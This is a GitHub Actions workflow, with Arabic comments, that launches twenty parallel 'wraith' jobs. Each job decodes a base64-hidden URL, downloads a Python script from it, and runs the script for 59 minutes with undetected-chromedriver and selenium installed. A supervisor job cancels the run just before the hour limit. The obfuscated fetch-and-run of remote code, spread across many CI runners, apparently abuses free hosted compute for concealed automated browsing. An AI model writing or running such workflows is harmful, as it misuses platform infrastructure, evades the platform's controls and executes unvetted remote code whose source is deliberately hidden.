name: Cascading Wraith Dispatch Grid

on:
  workflow_dispatch:

concurrency:
  group: wraith-grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # المُشرف السيادي: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
  # =================================================================
  sovereign-supervisor:
    name: "Sovereign Supervisor"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Set Supervisor Watch
        run: |
          echo "[SUPERVISOR] Sovereign supervisor in position. Watch set at the 59-minute line."
          echo "[SUPERVISOR] Run identifier logged: ${{ github.run_id }}"
          
          # فترة المراقبة المحددة (3540 ثانية = 59 دقيقة)
          sleep 3540
          
          echo "[SUPERVISOR] Line crossed! Releasing supervisor signal..."
          
          # إطلاق أمر الإلغاء عبر GitHub API
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[SUPERVISOR] Signal released. All active and waiting wraiths will be dispelled."

  # =================================================================
  # شبكة الأشباح المتوازية: تشكيل وتشغيل عُقد الأشباح
  # =================================================================
  wraith-grid:
    name: "WraithNode-${{ matrix.wraith_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        wraith_id: [601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620]

    steps:
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطبقة [أ]: تجهيز البنية التحتية
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Stage Infrastructure
        run: |
          echo "[STAGE] Staging infrastructure for WraithNode-${{ matrix.wraith_id }} on Linux..."
          sudo apt update -qq
          sudo apt install -y curl python3-pip

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطبقة [ب]: تنزيل الحزمة البرمجية
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Download Software Bundle
        run: |
          echo "[DOWNLOAD] Downloading wraith_core.py from designated supply line..."
          SUPPLY_LINE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$SUPPLY_LINE" -o wraith_core.py
          echo "[DOWNLOAD] Software bundle secured."

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطبقة [ج]: تزويد المكتبات المرافقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Provision Companion Libraries
        run: |
          echo "[PROVISION] Provisioning companion libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      # ⟴ الطبقة [د]: التنفيذ المقيّد بـ 59 دقيقة
      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
      - name: Activate Wraith Cycle
        run: |
          echo ">> Activating WraithNode-${{ matrix.wraith_id }} cycle..."
          
          # تشغيل العملية في الخلفية
          python3 wraith_core.py &
          WRAITH_PID=$!
          
          echo ">> Wraith cycle active. Duration cap: 59 minutes (3540s)."
          
          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
          sleep 3540
          
          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
          if kill -0 $WRAITH_PID 2>/dev/null; then
            echo ">> Duration cap reached! Dispersing cycle..."
            kill -9 $WRAITH_PID
            echo ">> Cycle dispersed by cap controller."
          else
            echo ">> Cycle ended within duration cap."
          fi
